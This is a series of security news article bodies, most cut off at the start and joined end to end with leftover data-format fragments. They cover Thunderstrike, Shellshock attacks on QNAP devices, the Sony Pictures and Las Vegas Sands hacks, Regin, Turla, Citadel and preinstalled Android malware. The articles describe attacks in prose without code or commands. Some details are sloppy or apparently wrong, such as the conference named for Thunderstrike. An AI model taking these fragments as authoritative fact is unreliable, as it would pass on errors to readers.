However, there is one technique to stop these spam messages — just reject all those messages that come from bogus accounts by checking whether the account from which you have received the spam email really exists or not. Users are also advised not to open or click on links and attachments that are provided in any suspicious email, but if the message is from your banking institution and of concern to you, then confirm it twice before proceeding." }

The hack was presented by programming expert Trammell Hudson at the annual Chaos Computer Congress (30C3) in Hamburg Germany. He demonstrated that it is possible to rewrite the firmware of an Intel Thunderbolt Mac. The hack, dubbed Thunderstrike, actually takes advantage of a years-old vulnerability in the Thunderbolt Option ROM that was first disclosed in 2012 but is yet to be patched. Thunderstrike can infect the Apple Extensible Firmware Interface (EFI) by allocating a malicious code into the boot ROM of an Apple computer through infected Thunderbolt devices. The hack is really dangerous as, according to the researcher, there is no means for the user to detect the hack, or remove it even by re-installation of the complete OS X, only because the malicious code actually is in the system’s own separate ROM. \"Since the boot ROM is independent of the operating system, reinstallation of OS X will not remove it. Nor does it depend on anything stored on the disk, so replacing the hard drive has no effect. A hardware in-system-programming device is the only way to restore the stock firmware.\" Hudson also showed that he could replace Apple's own cryptographic key with a new one, which will prevent legitimate firmware updates from being accepted. \"There are neither hardware nor software cryptographic checks at boot time of firmware validity, so once the malicious code has been flashed to the ROM, it controls the system from the very first instruction,\" Trammell Hudson said. \"It could use SMM and other techniques to hide from attempts to detect it.\" In addition to writing a custom code to the boot ROM, Hudson’s presentation also notes a method by which the bootkit could replicate itself to any attached Thunderbolt device, giving it the ability to spread across even air-gapped networks. In short, an attacker could use the vulnerable Thunderbolt port to install a custom bootkit, which could even replicate itself to any other Thunderbolt-attached device, thereby spreading all over across the networks. You can watch the entire presentation given by Hudson below and can also refer this blog post to know more about Thunderstrike. As far as Hudson knows, there are no Mac firmware bootkits in the wild and at this time, it exists only as a proof-of-concept. So, we can presume that the vulnerability can only be exploited if the attacker has physical access to the Thunderbolt Mac. Therefore, a regular Mac user need not to worry about the hack. Apple has already patched part of the vulnerability in the latest Mac mini and on the iMac with 5K Retina Display, which will soon be available for other Macs." }

Since, cybercriminals are known to take advantage of every major incident and any occasion that captures public attention – regardless of how sensitive – comes out to be an opportunity for spammers and hackers to snatch users’ personal information and spread malware, and the tragedy of the Missing AirAsia flight QZ 8501 is no exception. Cyber criminals are exploiting the disappearance of Indonesia AirAsia flight QZ 8501 by luring users to websites purporting to offer the latest news in order to steal their personal information. Our team has spotted some posts on social media claiming that the “Missing AirAsia flight QZ850 has been found and that all its passengers are safe and alive”. But once the user click on the news, the link redirects users to the malicious websites. It made me remind of the missing Malaysian Airlines flight MH370, a Boeing 777-200 aircraft incident which opened doors for many cybercriminals to infect online users. Indonesia Flight QZ 8501 lost its contact with air traffic control at 7:24 a.m. local time over the Java Sea after taking off from Surabaya, Indonesia, according to a statement from AirAsia. AirAsia flight QZ 8501 was scheduled to land in Singapore about an hour later. \"AirAsia Indonesia regrets to confirm that QZ8501 from Surabaya to Singapore has lost contact at 07:24hrs this morning,\" AirAsia tweeted. Missing AirAsia flight QZ 8501 was last tracked around the island of Belitung, at the coordinates 03°22’15\" South and 109°41’28\" East, before disappearing from radars. Due to night, search and rescue operations have been suspended, which the team will resume tomorrow. According to AirAsia, Indonesia flight QZ8501 had seven crew members and 155 passengers, including 137 adults, 17 children and one infant. The aircraft was flying at 32,000 feet and had asked to go to 38,000 feet due cloudy weather in the area. May be scammers and cyber crooks could exploit this tragic incident to target as many online users as they want. Because they know that users sitting over their online devices and operating social media accounts such as Facebook and Twitter, have had an eye on every news update related to the Missing AirAsia flight QZ8501. Cyber criminals may also come up with fake news websites in order to distribute malware and infect a large number of online users. So you need to have an eye on that too. WHAT AN ONLINE USER NEED TO KEEP IN MIND Beware! Before clicking a link for any news related to the Missing AirAsia flight QZ8501 over social networking sites such as Facebook and Twitter. Always go for the genuine and reputed news site for any updates regarding the Missing AirAsia flight. If any link claims you to show a video footage of the missing Indonesia flight QZ8501, please keep in your mind that their is no such video footage available yet. Beware of such fake videos and links that could spread in the wild across the various social media and other sites to abuse your network and system. If you’ve already shared or \"liked\" any such link, it’s probably best to delete malware post from your Facebook wall. First the tragic incident of Malaysia Plane MH370 from Kuala Lumpur to Beijing on March 2014, then the shooting down of Malaysia Airlines flight MH17 from Amsterdam to Kuala Lumpur on 17 July 2014, and now the Missing AirAsia flight QZ850 incident is really a matter of sorrow for all of us." }

Since its release, everyone is talking about \"The Interview\" — the Seth Rogen and James Franco-starring comedy centered around a TV host and his producer assassinating North Korean dictator Kim Jong Un. Because cybercriminals are known to take advantage of major events where there is a high level of public interest, The Interview became their target. In a joint investigation, Security researchers of McAfee and Technische Universität Darmstadt and the Center for Advanced Security Research Darmstadt (CASED) has discovered an Android app claiming to download 'The Interview' comedy on their smartphone devices actually infects users’ devices with banking trojan in order to steal their financial information. The Banking Trojan is appeared to be hosted on Amazon Web Services and is delivered via a torrent file. Researchers have identified that the malware campaign is targeting Android users in South Korea and is active from the last few days. The campaign is attempting to exploit the popularity of The Interview movie that triggered tension over its release on Christmas. The malware trojan, detected by the researchers at McAfee as Android/Badaccents, targets customers of some Korean banks as well as an international bank, Citi Bank. According to researchers, the Trojan is selective about its victims and avoids infection of devices sold in North Korea. \"One aspect which will probably raise eyebrows, is that the malware code includes a routine to check the device’s manufacturing information,\" Graham Cluley wrote on his blog. \"If it is set to either 삼지연 (Samjiyon) or 아리랑 (Arirang), smartphone manufacturers whose Android devices are sold in North Korea, the malware will not infect, and instead display a message that an attempt to connect to the server failed.\" The researchers' findings cited by Cluley revealed that at least 20,000 devices have been infected and that the information exfiltrated from the devices is uploaded to a Chinese mail server. Security researchers at McAfee has notified Amazon Web Security about the malware hosting issue so that the Amazon-hosted files can be removed and prevent further infections. However, other online storage services could be used by cybercriminals for carrying out the campaign. Usually cybercriminals use third party Android app to distribute trojan malware in order to infect smartphone users, but this is the first time when cyber crooks have chosen torrent websites to deliver the Trojan, probably because \"The Interview\" is already at the top of search results in Korea and most of the countries." }

Now, the China's third-largest mobile and world's sixth-largest phone manufacturer 'Coolpad', has joined the list. Millions of Android smartphones sold by Chinese smartphone maker Coolpad Group Ltd. may contain an extensive \"backdoor\" from its manufacturer that is being able to track users, push unwanted pop-up advertisements and install unauthorized apps onto users' phones without their knowledge, alleged a U.S. security firm. OVER 10 MILLION USERS AT RISK Researchers from Silicon Valley online security firm Palo Alto Networks discovered the backdoor, dubbed \"CoolReaper,\" pre-installed on two dozens of Coolpad Android handset models, including high-end devices, sold exclusively in China and Taiwan. The backdoor can let attackers completely hijack users' Android device by gaining access to their device information and functions. The backdoor presents several privacy and security risk, and is believed to impact over 10 million users worldwide. The security firm released a research paper Wednesday detailing its investigation on the backdoor software, called CoolReaper. FEATURES OF COOLREAPER BACKDOOR According to Ryan Olson, intelligence director at Palo Alto, CoolReaper backdoor can perform a wide number of unsolicited tasks. The backdoor has ability to: Download, install and activate any Android application without the user's consent or notification Connect to a number of command and control (C&C) servers Clear user data, uninstall existing applications, or disable system applications Send fake over-the-air (OTA) software updates to devices that install unwanted applications Send or insert arbitrary SMS or MMS messages into the phone Dial arbitrary phone numbers Upload device information, its location, application usage information, calling and SMS history to Coolpad server Researchers obtained only one of the Coolpad smartphone models sold in the U.S. and did not find CoolReaper on the device. So, they suspected that the CoolReaper backdoor comes pre-installed only on Coolpad handsets sold in China and Taiwan. The researchers conducted its investigation after reviewing complaints by the users on message boards about suspicious activities noticed on Coolpad devices. The security firm installed multiple copies of the custom ROMs installed on Coolpad devices in China and found that most included CoolReaper. \"CoolReaper is the first malware we have seen that was built and operated by an Android manufacturer,\" researchers wrote. \"The changes Coolpad made to the Android OS to hide the backdoor from users and antivirus programs are unique and should make people think twice about the integrity of their mobile devices.\" CHINA BEING CRITICIZED MANY TIMES This isn't the first time when Chinese phone manufacturer is criticized for its products. Six months ago, a popular and cheap handset device in China, the Star N9500 smartphone came pre-installed with a Trojan that allowed manufacturer to spy onto their users' comprising their personal data and conversations without any restrictions and users' knowledge. Also, the latest claim against Chinese smartphone manufacturers was the allegation that the popular Chinese smartphone brand, Xiaomi has been suspected of \"secretly\" stealing users' information from the device without the user's permissions and sending it back to a server in Beijing, despite of turning off the data backup functions. Palo Alto Networks is the same security firm that discovered \"WireLurker\" malware that was targeting Mac and iOS users in China, and the main concern to worry about the threat was its ability to attack non-jailbroken iOS devices. The malware appeared as the first malicious software program with the ability to penetrate the iPhone's strict software controls." }

Cyber criminals are actively exploiting this critical GNU Bash vulnerability to target those network attached storage devices that are still not patched and ready for exploitation. Security researchers have unearthed a malicious worm that is designed to plant backdoors on network-attached storage (NAS) systems made by Taiwan-based QNAP and gain full access to the contents of those devices. The worm is spread among QNAP devices, which run an embedded Linux operating system, by the exploitation of the GNU Bash vulnerability known as ShellShock or Bash, according to security researchers at the Sans Institute. QNAP vendor released a patch in early October to address the flaw in its Turbo NAS product, but because the patches are not automatic or easy to apply for many users, so a statistically significant portion of systems remain vulnerable and exposed to the Bash bug. Shellshock vulnerability was among the critical and serious Internet vulnerabilities uncovered this year, as the vulnerability in Bash, aka the GNU Bourne Again Shell, affects Linux and UNIX distributions to a large extent, but also Windows in some cases. The flaw exploits a bug in GNU Bash that gives attackers the ability to run execute shell commands of their choice remotely on vulnerable systems using specifically crafted variables. \"The attack targets a QNAP CGI script, /cgi-bin/authLogin.cgi, a well known vector for Shellshock on QNAP devices,\" Johannes B. Ullrich, head of the Internet Storm Center at the SANS Institute, wrote in the blog post published Sunday. \"This script is called during login, and reachable without authentication. The exploit is then used to launch a simple shell script that will download and execute a number of additional pieces of malware.\" Once the device is infected by the worm, malicious components also execute a script that makes the device to carry out click fraud scam against an online advertising network JuiceADV. A number of other scripts are also installed on the infected system. The worm is dangerous because the \"infected devices have been observed scanning for other vulnerable devices,\" Ullrich said. According to the researcher, the infected systems are equipped with a secure shell (SSH) server on port 26 and a new administrative user, which gives the attackers a determined backdoor to hide into the device at any time in the future. \"The DNS change is likely made to avoid logging and potentially blacklisting of any affected domains,\" Ullrich said. \"The SSH server is a second SSH server that is being launched, in addition to the normal SSH server on port 22. This second SSH server, and the additional user added to the system, provides the attacker with persistent access to the system.\" More interestingly, the worm also patches the notorious Shellshock vulnerability on the infected devices by downloading and applying the security updates from QNAP and reboot the device, in order to prevent other attackers from taking over the compromised device." }

The news broke throughout the WordPress community earlier Sunday morning when Google blacklisted over 11,000 domains due to the latest malware campaign, that has been brought by SoakSoak.ru, thus being dubbed the ‘SoakSoak Malware’ epidemic. While there are more than 70 million websites on the Internet currently running WordPress, so this malware campaign could be a great threat to those running their websites on WordPress. Once infected, you may experience irregular website behavior including unexpected redirects to SoakSoak.ru web pages. You may also end up downloading malicious files onto your computer systems automatically without any knowledge. The search engine giant has already been on top of this infection and has added over 11,000 websites to their blacklist that could have seriously affected the revenue potential of website owners, running those blacklisted websites. The security team at the security firm Sucuri, which is actively investigating the potential vector of the malware, said that the infections are not targeted only at WordPress websites, but it appears that the impact seems to be affecting most hosts across the WordPress hosting spectrum. SoakSoak malware modifies the file located at wp-includes/template-loader.php which causes wp-includes/js/swobject.js to be loaded on every page view on the website and this “swobject.js” file includes a malicious java encoded script malware. If you run any website and are worried about the potential risk of the infection to your website, Sucuri has provided a Free SiteCheck scanner that will check your website for the malware. The exact method of intrusion has not been pointed out at this time, but numerous signals led to believe us all that many WordPress users could have fallen victim to this attack. However, if you are behind the Website Firewall, CloudProxy, you are being protected from the SoakSoak malware campaign." }

Now, a similar cyber attack against Casino operator Las Vegas Sands Corp has been revealed that occurred on February 2014. The cyber attack occurred on this year’s February but the details of damages to the casino was not publicized until Bloomberg Businessweek exposed it in a story on Thursday. Hackers crippled thousands of servers and computers across the network of the giant Las Vegas Sands Corp. by wiping them with highly destructive malware. The hack attack was believed to be in response to the statement given by the chief executive officer and largest shareholder of Las Vegas Sands Corp., Sheldon Adelson. On October 2013, the billionaire made a statement at the Manhattan campus of Yeshiva University that Iran should be bombed to get the country to abandon its own nuclear program. \"What I would do,\" he said during the panel, rather than negotiating, \"would be to say, ‘Do you see that desert over there? I want to show you something.’ You pick up your cell phone and you call somewhere in Nebraska and you say ‘Ok let it go.’…Then you say, ‘See? The next one is in the middle of Tehran.\" This statement given by Adelson circulated on all over the Internet and reached Iran’s Supreme Leader Ayatollah Ali Khameeni, who responded after two weeks later and said that the American government should \"slap these prating people in the mouth and crush their mouths.\" Two months later, the attackers attacked the Las Vegas Sands’ IT network to destroy the corporation and continues their attacks last January on the company’s virtual private network gateway at its slots casino in Bethlehem, Pennsylvania. The attack went worse in February, when hackers breached server for the casino’s website and used an open tool to fetch usernames and passwords. Finally, they found the credentials of a senior systems engineer who had visited the Bethlehem site from Las Vegas, which gave them keys to the corporate castle. The attackers wiped out data on computers and servers and erased hard drives, as malware ripped through the company’s networks. \"Those credentials got the hackers into the gaming company’s servers in Las Vegas,\" Bloomberg reported. \"As they rifled through the master network, the attackers readied a malware bomb. Typing from a Sony (SNE) VAIO computer, they compiled a small piece of code, only about 150 lines long, in the Visual Basic programming language.\" Hackers posted personal information about Sands Bethlehem employees, stolen email addresses and social security numbers. They also left personal messages for Adelson, \"Encouraging the use of Weapons of Mass Destruction, UNDER ANY CONDITION, is a Crime, signed, the Anti WMD Team,\" said one. \"Damn A, Don’t let your tongue cut your throat,\" warned another. The virus was written in a Visual basic language, which is a common desktop programming language. Visual basic malwares were used in past because of a limitation that it runs on Windows system. A spokesperson for cybersecurity firm Dell SecureWorks, who was brought to clean up the after-damage caused to the company and determine its actual cause, denied to comment on the issue due to the policy made by the company not to discuss work done for a customer. Also, the company spokesman Ron Reese declined to comment on the details provided in the report published by Bloomberg, saying, \"I'm not going to confirm anything that was speculated or written in the Bloomberg story.\"" }

A previously unknown piece of a larger puzzle called \"Turla,\" one of the most complex Advanced Persistent Threats (APTs) uncovered by researchers at Kaspersky Lab in August, remained hidden on some systems for at least four years. The malware was notable for its use of a rootkit that made it extremely hard to detect. The German security company G Data believed that Turla campaign is linked to Russia and has in the past exploited a variety of Windows vulnerabilities, at least two of which were zero-days, to infect government institutions, embassies, military, education, research, and pharmaceutical companies in more than 45 countries. Recently, security researchers from Moscow-based Kaspersky Lab have detected the first Turla sample targeting Linux operating system. This Linux component of malware points towards a much bigger threat than it was previously thought and it may also herald the discovery of more infected systems. \"The newly discovered Turla sample is unusual in the fact that it's the first Turla sample targeting the Linux operating system that we have discovered,\" Kaspersky researcher Kurt Baumgartner said in an advisory. \"We suspect that this component was running for years at a victim site, but do not have concrete data to support that statement just yet.\" The modules of the Linux-based Turla malware is written in C and C++ languages and contains code from previously written libraries. The malware uses hidden network communication and stripped of symbol information, which makes it hard for researchers to reverse engineer or analyze. As a result, the Linux-based Turla trojan may have capabilities that have not yet been uncovered completely, as Baumgartner said the Linux component is a mystery even after its discovery, adding it can't be detected using the common Netstat command. In order to hide itself, the backdoor sits inactive until hackers send it unusually crafted packets that contain \"magic numbers\" in their sequence numbers. The malware have ability to sit unnoticed on victims computers for years. The trojan contained attack functionalities including arbitrary remote command execution, incoming packet interception and remote management even though it requires no root system privileges. Earlier this year, Kaspersky Labs researches suggested Turla as Snake, which was built on the capabilities of Agent.Biz, the worm that came to the surface in 2008 when US Department of Defense sources claimed that its classified networks had been breached by an early version of the same virus, described by officials as the \"worst breach of US military computers in history.\" Uroburos rootkit was also one of the components of Snake campaign. Agent.Biz has since been developed with many advanced features that make it even more flexible and sophisticated than before. It was thought to have inspired other nasty malware creations including Flame and Guass." }

DeathRing malware app cannot be uninstalled or removed by the end user or by antimalware software because it comes pre-installed in the system directory of the handsets at an unknown point within the supply chain, making the threat even more severe. WHAT DOES DEATHRING DO? Though the malware pretends to be a genuine ringtone app, but actually downloads SMS and WAP content from its command-and-control server to the victim’s handset, which gives it potential to phish user’s sensitive data through fake text messages. \"DeathRing might use SMS content to phish victim’s personal information by fake text messages requesting the desired data,\" the security firm LookOut wrote in a blog post. \"It may also use WAP, or browser, content to prompt victims to download further APKs - concerning given that the malware authors could be tricking people into downloading further malware that extends the adversary’s reach into the victim’s device and data.\" AFFECTED SMARTPHONE HANDSETS DeathRing malware pre-loaded on a number of entry-level phones sold by third-tier manufacturers to developing countries and according to the security firm, the handsets affected are: Counterfeit Samsung GS4/Note II A variety of TECNO devices Gionee Gpad G1 Gionee GN708W Gionee GN800 Polytron Rocket S2350 Hi-Tech Amaze Tab Karbonn TA-FONE A34/A37 Jiayu G4S – Galaxy S4 clones, Haier H7 a i9502+ Samsung clone by an unspecified manufacturer However, DeathRing is not the first pre-installed mobile malware spotted by the firm. Earlier this year, LookOut discovered another pre-loaded piece of malware called Mouabad on devices sold by retailers in China, India, and the Philippines. Similar to DeathRing, Mouabad is also somewhere pre-loaded in the supply chain and affected predominantly Asian countries." }

Following the hack, hackers leaked five unreleased Sony movies to Torrent file-sharing website during Black Friday. It's still not clear whether both the incident back to back with Sony Pictures belongs to same group of hackers or not, but here's what you need to know about the breach: 1. FBI MALWARE WARNING AFTER SONY PICTURES HACK The U.S. Federal Bureau of Investigation (FBI) warned businesses that cyber criminals have used malicious software to launch destructive cyber-attacks in the United States, following the last week's massive data breach at Sony Pictures Entertainment, in which four unreleased films were stolen and pirate-shared. In a five-page confidential 'flash' warning, FBI recommended users to strengthen the protection of their information systems and limit access to databases. But when asked if the same malicious software had been used against the Sony Pictures hack, FBI declined to comment. This new \"destructive\" malware has capability to overwrite a victim host's master boot record and all data files. \"The overwriting of the data files will make it extremely difficult and costly, if not impossible, to recover the data using standard forensic methods,\" according to Reuters who independently obtained the report. 2. IS NORTH KOREA BEHIND THE CYBER ATTACK ON SONY PICTURES ? As we reported earlier, Sony Pictures is investigating the possibility that hackers working on behalf of North Korea were behind the hacking incident. Sony hack is the payback for upcoming Kim Jong assassination comedy film. It is because the hack comes just a month before the scheduled release of Sony's upcoming comedy \"The Interview,\" a comedy about two journalists who are recruited by the CIA to assassinate North Korean leader Kim Jong Un. The film became a source of international controversy, and the Pyongyang government denounced the film as \"undisguised sponsoring of terrorism, as well as an Act of War\" in a letter to U.N. Secretary-General Ban Ki-moon in June. But pointing finger towards North Korea without any strong evidence would be wrong. So, we still won't confirm whether its cyber war by North Korea or some other unknown, sophisticated hacker. 3. FIVE MOVIE LEAKED LINKED TO SONY PICTURES Following the last weeks cyber-attack on Sony Pictures Entertainment, high-quality versions of five newest films – Annie, Fury, Still Alice, Mr. Turner and To Write Love on Her Arms – distributed by Sony Pictures leaked online during Black Friday. Four of the leaked films have yet to hit the big screen. The remake of the 1982 released \"Annie\" is Sony's next big film, schedule to hit theaters on Dec. 19 with new stars Quvenzhané Wallis, Cameron Diaz and Jamie Foxx. Two other new films, \"Mr. Turner\" and \"Still Alice\" are also considered possible Oscar contenders for their lead actors Timothy Spall and Julianne Moore. 4. SONY HIRED FIREEYE FOR INVESTIGATION Sony Pictures Entertainment has hired Mandiant incident response team of FireEye Inc to help clean-up the damage caused by the huge cyber attack on its network, which forced its employees to put pen to paper over the last few weeks. In addition to the FireEye, FBI is also investigating the matter and is looking into the devastating leak of four of its upcoming movies, although it has not been confirmed that the leak of all the films came from the same data breach. Mandiant is a well-known security incident response team of FireEye which deals in forensic analysis, repairs and network restoration. Mandiant is the same team that helped in the catastrophic security breach experienced by one of the world's largest retailer Target in 2013. 5. SONY PICTURES HACK IS NOT THE COMPANY'S FIRST TIME HACK In August, Sony's PlayStation Network was completely taken down by a distributed denial-of-service (DDoS) attack, a common technique used by hackers to overwhelm a system with traffic and make the network temporarily inaccessible to users. The gaming network also suffered a more severe hack in 2011, which led to the exposure of 77 million PlayStation and Qriocity accounts along with 25 million Sony Online Entertainment accounts, bringing the total to more than 100 million in one of the largest data breaches ever. The hack cost Sony 14 billion yen ($172 million), and it took the networks -- for downloading and playing games, movies, and music -- offline for about a month before bringing them back up." }

A Phoenix-based security researcher Joe Giron found that a surprising amount of users’ data is being collected by the company’s mobile application for Android. Researcher, who runs a cyber security firm in Arizona, just reverse-engineered the code of Uber’s Android application and come to the conclusion that it is a malware. He discovered that the app \"calls home\" and sends data back to the company. But this excessive amount of access to users’ data is not the sort of app data a taxi company should have access to in the first place. It really seems strange and unnecessary to collect. \"Christ man! Why the hell would it want access to my camera, my phone calls, my Wi-Fi neighbors, my accounts, etc?\" Joe writes in his Security Blog. \"Why the hell is this here? What’s it sending? Why? Where? I don’t remember agreeing to allow Uber accedes to my phone calls and SMS messages. Bad NSA-Uber.\" Now one thing strikes in our mind that today a large number of Smartphone applications have access to users’ app data, so what’s the difference between others and Uber’s way of accessing your data?? Here we present you a long list of everything the Uber Android app can have about its users, revealed by a thread on Ycombinator: Accounts log (Email) App Activity (Name, PackageName, Process Number of activity, Processed id) App Data Usage (Cache size, code size, data size, name, package name) App Install (installed at, name, package name, unknown sources enabled, version code, version name) Battery (health, level, plugged, present, scale, status, technology, temperature, voltage) Device Info (board, brand, build version, cell number, device, device type, display, fingerprint, ip, mac address, manufacturer, model, os platform, product, sdk code, total disk space, unknown sources enabled) GPS (accuracy, altitude, latitude, longitude, provider, speed) MMS (from number, mms at, mmss type, service number, to number) NetData (bytes received, bytes sent, connection type, interface type) PhoneCall (call duration, called at, from number, phone call type, to number) SMS (from number, service number, sms at, sms type, to number) TelephonyInfo (cell tower id, cell tower latitude, cell tower longitude, imei, iso country code, local area code, meid, mobile country code, mobile network code, network name, network type, phone type, sim serial number, sim state, subscriber id) WifiConnection (bssid, ip, linkspeed, macaddr, networkid, rssi, ssid) WifiNeighbors (bssid, capabilities, frequency, level, ssid) Root Check (root staus code, root status reason code, root version, sig file version) Malware Info (algorithm confidence, app list, found malware, malware sdk version, package list, reason code, service list, sigfile version) \"Why the hell would they need this? I know I keep asking questions, but here’s some answers: Uber checks to see if your device is rooted. It doesn’t tell you of course, it just wants to know so it can phone home and tell them about it. I also saw checks for malware, application activity and a bunch of other stuff,\" the publication adds. The ride-driving company might have some legitimate reason to make use of most of this collected information in the app, perhaps for fraud detection or an intelligence-gathering tool. But, the problem is that the information is being sent and collected by Uber’s servers without any knowledge or permission of the app user. Neither the extent of the data the Uber app collects seems to go beyond the data set shown on its permissions screen. Uber responded to the issue and said in a statement to Cult of Mac, \"Access to permissions including Wifi networks and camera are included so that users can experience full functionality of the Uber app. This is not unique to Uber, and downloading the Uber app is of course optional.\"" }

Are you using electronic cigarettes (E-cigarettes) instead normal ones?? Still, you should quit your smoking habit, because it not only damages your health, but could pose a danger risk to the health of your computer. E-cigarettes have become the latest vector for hackers to distribute malicious software. E-cigarettes manufactured in China are reportedly being used to spread malware via a USB port to computers when users plug in for charging it up. The report broke when an executive at a \"large corporation\" had been infected with malware from an undetermined source after he quit smoking and switched to e-cigarettes made in China, detailed a recent post to social news forum Reddit. Further investigating the matter, he found that the chargers of the e-cigarettes - bought from the online auction site eBay for $5 - are hard-coded with the malware that infected his workstation despite having latest virus and anti malware programs installed. \"The executive's system was patched up to date, had antivirus and anti-malware protection,\" Reddit user Jrockilla said. \"Web logs were scoured and all attempts made to identify the source of the infection but to no avail.\" \"Finally after all traditional means of infection were covered, IT started looking into other possibilities. They finally asked the executive: 'Have there been any changes in your life recently?' The executive answered: 'Well yes, I quit smoking two weeks ago and switched to e-cigarettes.' And that was the answer they were looking for.\" Rik Ferguson, a security consultant for Trend Micro, also considers the matter plausible and says, \"Production line malware has been around for a few years, infecting photo frames, MP3 players and more.\" In 2008, for instance, a photo frame produced by Samsung shipped with malware on the product's install disc, the Guardian reported. \"Hackers are able to exploit any electronic device to serve malware to a poorly protected network,\" Pierluigi Paganini, chief information security officer at ID management firm, said in a blog post. \"Despite the [fact the] idea could appear hilarious, many electronic cigarettes can be charged over USB using a special cable or by inserting one end of the cigarette directly into a USB port.\" The idea is similar to the BadUSB, whose source code was released by the researchers last month on the open source code hosting website Github. BadUSB was capable to spread itself by hiding in the firmware meant to control the ways in which USB devices connect to computers. Ferguson explained that \"a very strong case can be made for enterprises disabling USB ports, or at least using device management to allow only authorised devices.\"" }

Sony appears to be hacked once again by hackers, but this time not its PlayStation, instead its Sony Pictures Entertainment – the company’s motion picture, television production and distribution unit. According to multiple reports, the corporate computers of Sony Picture employees in New York and around the world were infiltrated by a hacker, displaying a weird skeleton, a series of URL addresses, and a threatening message that reads: \"Hacked By #GOP Warning: We've already warned you, and this is just a beginning. We continue till our request be met. We've obtained all your internal data, including your secrets and top secrets. If you don't obey us, we'll release data shown below to the world. Determine what will you do till November the 24th, 11:00 PM (GMT).\" News broke after a user, who claimed to be a former Sony staff, posted allegations of the security breach with the defacement image on Reddit. Hackers group that identifies itself as #GOP (Guardians of Peace) claimed responsibility for the defacement across staff computers at Sony Pictures, and apparently stolen reams of internal corporate data as well. Some reports also claims that the group also gained access to dozens of the company's Twitter accounts linked to movies such as Stomp The Yard, Soul Surfer, and Starship Troopers, but the company has since regained control of those. A source within Sony has anonymously confirmed to TNW that the hack and the defacement image that have appeared on Staff computers inside Sony Pictures is real. They said that \"a single server was compromised and the attack was spread from there.\" The group leaked a large ZIP file containing a list of filenames of a number of documents pertaining to Sony Pictures financial records along with private keys and passwords for access to servers. There is even a text file that contains the list of last 10 recently used passwords for something at Sony. The defacement message shown on staff computers mentions \"demands\" that must be met by November 24th at 11:00PM GMT or the files named will be released. While the motives behind the hack are still unclear, but the group says it will expose more details to the public if what appeared to be a reference to demands quietly sent to the company earlier were not fulfilled by them. According to Variety, Sony Pictures information-technology departments have instructed employees to turn off their computers as well as disable Wi-Fi on all mobile devices. Sony Pictures hasn't confirmed the intrusion yet, instead saying it was investigating \"an IT matter\" in a statement." }

The nasty malware, dubbed \"Regin\", is said to be more sophisticated than both Stuxnet and Duqu, according to the researchers at antivirus software maker Symantec Corp. DEVELOPED BY NATION STATE The research showed that the Regin malware is believe to be developed by a wealthy \"nation state\" and is a primary cyber espionage tool of a nation state because of the financial clout needed to produce code of this complexity with several stealth features to avoid detection. But, the antivirus software maker didn't identify which country was behind it. \"It is likely that its development took months, if not years, to complete and its authors have gone to great lengths to cover its tracks. Its capabilities and the level of resources behind Regin indicate that it is one of the main cyber espionage tools used by a nation state,\" said Symantec Security Response team. \"The security firm did not name a nation as the source of Regin, but is willing to say most of its victims were from Russia and Saudi Arabia and were targeted between 2008 and 2011 with a since decommissioned version of the malware that re-surfaced after 2013.\" Regin uses a modular approach allowing it to load features that exactly fit the target, enabling a customized spying. The malware's design makes it highly suited for persistent, long-term mass surveillance operations against targets, the company said. The nasty malware's main targets include Internet service providers and telecommunications companies, where it appears the complex software is used to monitor calls and communications routed through the companies' infrastructure. Other targets include organisations in hospitality, energy, airline, health sectors and research. HIGHLY CUSTOMIZABLE FIVE STAGE STRUCTURE Regin's highly customizable nature allows large-scale remote access Trojan capabilities, including password and data theft, hijacking the mouse's point-and-click functions, and capturing screenshots from infected computers. Other infections were identified monitoring network traffic and analyzing email from Exchange databases. \"Customisable with an extensive range of capabilities depending on the target, it provides its controllers with a powerful framework for mass surveillance and has been used in spying operations against government organisations, infrastructure operators, businesses, researchers, and private individuals,\" Symantec said. In order to remain stealthy, Regin is organized into five layers, each \"hidden and encrypted, with the exception of the first stage.\" It's a multi-stage attack and each stage reveals the overall attack. Executing the first stage starts a domino chain in which the second stage is decrypted and executed, and that in turn decrypts the third stage, and so on. NASTY MODULES The whole picture of the malware only emerges when you have acquire all five stages because each individual stage provides little information on the complete package. Regin contains dozens of payloads, including code for capturing screenshots, seizing control of an infected computer's mouse, stealing passwords, monitoring network traffic, and recovering deleted files. Other modules appear to be tailored to specific targets. Specialist modules were found monitoring the traffic of Microsoft Internet Information Services (IIS) server, parsing mail from Exchange databases, and collecting administration traffic for mobile base station controllers." }

But luckily to make the whole process easy, there is a growing market for password managers which provides an extra layer of protection. Wait! Wait! Seriously?? Security researchers have discovered a new variant of data-stealing Citadel Trojan program used by cybercriminals to slurp up users' master passwords for a number of password management applications and other authentication programs, which will let you think twice before using one. Citadel Trojan malware program has typically been used to steal online banking credentials and other financial information by masquerading itself as legitimate banking sites when victims open it in their local browser, which is also known as a man-in-the-browser attack. The malware has previously targeted users’ credentials stored in the password management applications included in popular Web browsers, however, third-party best password managers have typically not been targeted by the attackers. But, researchers at IBM Trusteer noted that the configuration file of the notorious malware had been modified to activate a keylogger when users opened either Password Safe or KeePass, two open-source password managers. Designed to steal the \"Master Password\" that protects access to the database of the end-user's passwords. \"Password management and authentication programs are important solutions that help secure access to applications and Web Services,\" Dana Tamir, director of enterprise security at Trusteer, wrote on IBM’s Security Intelligence blog. \"If an adversary is able to steal the master password and gains access to the user/password database of a password management solution or compromise authentication technology, the attacker can gain unfettered access to sensitive systems and information.\" In addition, the new Citadel variant also targets the enterprise authentication solution Nexus Personal Security Client used to secure financial transactions and other services that require heightened security, according to research from data-protection company IBM Trusteer. Once the malware infected a computer, it waits until one of the configured process is launched. The malware then logs keystrokes to steal the master passwords, allowing cybercriminals complete control over the machine and victims’ every online account protected by that password manager. The Citadel Trojan has been in existence since 2011 that has already compromised millions of computers around the world. According to the security researchers, Citadel is \"highly evasive and can bypass threat detection systems.\" \"[The Citadel variant] might be an opportunistic attack, where the attackers are trying to see which type of information they can expose through this configuration, or a more targeted attack in which the attackers know that the target is using these specific solutions,\" reads the blog. In June last year, the tech giant Microsoft along with the FBI and financial services companies launched a \"takedown\" operation against Citadel botnets, which had stolen more than $500 million from bank accounts over the past 18 months. At the time, the group claimed it disrupted more than 90% of Citadel botnets." }

